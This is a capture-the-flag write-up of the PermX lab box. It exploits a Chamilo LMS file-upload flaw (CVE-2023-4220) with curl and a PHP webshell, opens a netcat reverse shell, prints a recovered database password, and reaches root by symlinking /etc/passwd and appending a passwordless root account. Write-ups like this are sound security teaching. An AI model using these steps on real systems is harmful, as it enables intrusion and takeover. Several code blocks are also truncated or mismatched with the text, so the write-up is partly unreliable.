The PermX box was compromised by exploiting a file upload vulnerability in the Chamilo LMS, gaining initial access as `www-data`. After that, database credentials were recovered, allowing for SSH access as `mtz`. Finally, a vulnerable sudo script was leveraged to modify the `/etc/passwd` file, leading to root access

## Common Enumeration

### Namp

I fired up the command: `sudo nmap -p- -sC -sV -oA recon/allport 10.10.11.23 --open`. It scans all ports, uses default scripts, checks versions, outputs to a file, and only shows open ones and two ports were open: 

- SSH (port 22)
- HTTP (port 80)

```bash
$ nmap -p- -sC -sV -oA recon/allport 10.10.11.23 --open
Starting Nmap 7.92 ( https://nmap.org ) at 2024-07-25 18:35 AEST

```

It redirected to `permx.htb`, I added to my `/etc/hosts` file:

```bash
10.10.11.23    permx.htb
```

### Website - 80

Browsing the website `permx.htb` - brings up the pretty standard home page for some eLearning platform

At the bottom of the page, an email address and a newsletter signup form that didn’t actually submit any data. It’s always worth checking these things, even if they seem like dead ends

### Directory / Subdomain Brute forcing

Nothing screaming "exploit me" here. So, I switched gears and went for subdomain brute-forcing with FFUF

```bash
$ gobuster dir -u http://permx.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -b 404,403

FFUF found the `lms` subdomain, which was a lot more interesting than what we had on the main site

### Website (lms.permx.htb)

So, I navigated to `http://lms.permx.htb/`, and a login page appeared

I went back to the basics and ran Gobuster on the lms subdomain

Checking out the `/documentation`, I found it's using `Chamilo 1.11`. A quick Google search for "Chamilo 1.11 exploit" led me to this [blog post](https://starlabs.sg/advisories/23/23-4220/) that detailed a file upload vulnerability (CVE-2023-4220). I followed the Proof-of-Concept (PoC) from the blog

First, I created a simple PHP reverse shell, which would execute the 'id' command, just to test if it works

```bash
$ echo '<?php system("id"); ?>' > rce.php
```

Then, I used `curl` to upload it to the vulnerable endpoint

```bash
$ curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
The file has successfully been uploaded.
```

I used another curl command to execute it

```bash
$ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The command was executed successfully! The `rce.php` file was in "/main/inc/lib/javascript/bigupload/files" directory

![img](/assets/img/PermX/4.webp)

## Shell as www-data

I set up a netcat listener on my machine with `nc 10.10.14.7 -lvnp 1337`, and modified the `rce.php`. and repeated the process to upload the new `rce.php`. Now, after executing it with `curl`, I got the shell as `www-data`

```bash
$ nc 10.10.14.7 -lvnp 1337
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on 10.10.14.7:1337
Ncat: Connection from 10.10.11.23.
Ncat: Connection from 10.10.11.23:49218.
bash: cannot set terminal process group (1172): Inappropriate ioctl for device

www-data
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ 
```

started looking around, and after some digging, I found database credentials in `/var/www/chamilo/app/config/configuration.php`

```bash
course_info.conf.dist.php  parameters.yml.dist

## SSH as mtz

I used password `03F6lY3uXAP2bkW8` to log in as different users. And boom, it worked! I was able to SSH into the box as user `mtz` and grep the `user.txt`

```text
8b20406...
```

Now, it's time for privilege escalation. As is the standard, I started by checking what commands I could run with sudo using `sudo -l`: 

```bash
$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

Interesting! I saw that `mtz` could run `/opt/acl.sh` without a password using `sudo`. I took a peek at the contents of `acl.sh`

```md
Here's a high-level summary of the script:
- **Argument Check:** The script requires exactly three arguments: a username, permission set, and a file path.
- **Path Validation:** It ensures the file path starts with `/home/mtz/` and does not contain `..` to avoid directory traversal.
- **File Verification:** It checks if the specified path is a file, not a directory.
- **Apply ACL Permissions:** If all checks pass, it uses `sudo` to set Access Control List (ACL) permissions on the target file for the specified user.
```
## Shell as root

Let's break this down. 
- The `/opt/acl.sh` script takes three arguments: a username, permissions, and a file path
- It checks if the file path starts with `/home/mtz/`, doesn’t contain `..` (to prevent directory traversal), and verifies that the path points to a file
- If all these checks pass, the script applies ACL permissions to the file for the specified user

```bash
$ cat /opt/acl.sh
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"

```

So, here's how I got root:

- I created a symbolic link from `/etc/passwd` to a file called `test` in the `/home/mtz/` directory
- Then, I used the `acl.sh` to modify `/home/mtz/test` to make it writable to `mtz`
- Finally, I used the user `rootme` to log into the root shell. And, I grep the root flag!

```bash
$ ln -s /etc/passwd /home/mtz/test
sudo /opt/acl.sh mtz rw /home/mtz/test
echo "rootme::0:0:rootme:/root:/bin/bash" >> ./test
mtz@permx:~$ su rootme
